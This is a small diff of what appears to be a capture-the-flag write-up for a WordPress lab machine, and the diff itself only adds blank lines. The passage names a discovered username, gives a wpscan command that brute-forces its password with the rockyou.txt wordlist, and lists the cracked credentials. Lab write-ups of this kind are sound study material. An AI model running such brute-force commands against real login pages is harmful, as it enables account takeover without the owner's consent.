@@ -7,7 +7,9 @@ machine ip : 10.10.40.170
 We find a username there -- `kwheel`
 
 Running a bruteforce for the password using wpscan gives us the creds.
+
 `wpscan --url HOST-IP --usernames kwheel -P rockyou.txt`
+
 kwheel - cutiepie1			## wpscan
 
 ## Exploit
